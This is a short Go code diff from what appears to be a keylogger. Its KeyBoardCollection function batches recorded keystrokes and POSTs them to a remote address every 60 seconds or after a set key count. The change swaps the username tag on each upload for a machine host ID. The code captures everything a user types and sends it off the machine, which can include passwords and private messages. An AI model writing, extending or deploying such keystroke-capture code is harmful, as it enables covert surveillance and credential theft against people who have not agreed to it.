@@ -20,7 +20,7 @@ var (
 
 type msg struct {
 	Record string `json:"record"`
-	User   string `json:"user"`
+	Hostid string `json:"hostid"`
 }
 
 type KeyboardStatusResponse struct {
@@ -38,11 +38,11 @@ func KeyBoardCollection(addr string) {
 		elapsedsec = int64(elapsed/time.Millisecond) / 1000
 		// 1mins 60s   hitting 180 times keyboard
 		keyboardStatusResponse := KeyboardStatusResponse{}
+		var versionDetail = machineinfo.GetSystemVersion()
 		if elapsedsec == 60 {
-			user := machineinfo.GetUserName()
 			msgstb := msg{
 				Record: tmpKeylog,
-				User:   user,
+				Hostid: versionDetail.Hostid,
 			}
 			resp, _, err := gorequest.New().
 				Post(addr).
@@ -58,10 +58,9 @@ func KeyBoardCollection(addr string) {
 			}
 			continue
 		} else if len(tmpKeylog) >= KeyCount {
-			user := machineinfo.GetUserName()
 			msgstb := msg{
 				Record: tmpKeylog,
-				User:   user,
+				Hostid: versionDetail.Hostid,
 			}
 			resp, _, err := gorequest.New().
 				Post(addr).
